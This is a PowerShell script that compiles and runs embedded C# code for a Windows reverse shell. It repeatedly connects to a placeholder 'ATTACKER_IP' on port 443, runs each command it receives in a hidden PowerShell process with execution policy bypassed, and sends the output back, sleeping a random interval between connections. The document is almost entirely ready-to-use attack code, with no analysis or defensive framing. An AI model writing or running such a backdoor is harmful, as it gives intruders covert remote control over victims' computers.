$payload = @"
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;

namespace ReverseShellCs
{
    public class Program
    {
        public static void Main()
        {
            while (true)
            {
                var seconds = GetRandomSeconds();
                Connect("ATTACKER_IP");
                Thread.Sleep(seconds);
            }
        }

        public static string Exec(string cmd)
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "powershell.exe";  // Use PowerShell but you can use cmd.exe
            startInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"" + cmd + "\"";
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;  // Ensure hidden
            startInfo.CreateNoWindow = true;  // Prevent any window creation
            process.StartInfo = startInfo;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();
            return output + error;  // Combine stdout and stderr
        }

        public static void Connect(string server)
        {
            Int32 port = 443;
            TcpClient tcpClient = new TcpClient(server, port);
            NetworkStream stream = tcpClient.GetStream();
            var data = new Byte[256];
            String cmd = String.Empty;
            Int32 bytes = stream.Read(data, 0, data.Length);
            cmd = System.Text.Encoding.ASCII.GetString(data, 0, bytes).TrimEnd('\n');
            var cmdOutput = Exec(cmd);
            byte[] msg = System.Text.Encoding.ASCII.GetBytes(cmdOutput);
            stream.Write(msg, 0, msg.Length);
            stream.Close();
            tcpClient.Close();
        }

        public static int GetRandomSeconds()
        {
            Random rand = new Random();
            return rand.Next(10000);
        }
    }
}
"@   # <-- this must be alone on its own line

Add-Type $payload
[ReverseShellCs.Program]::Main()
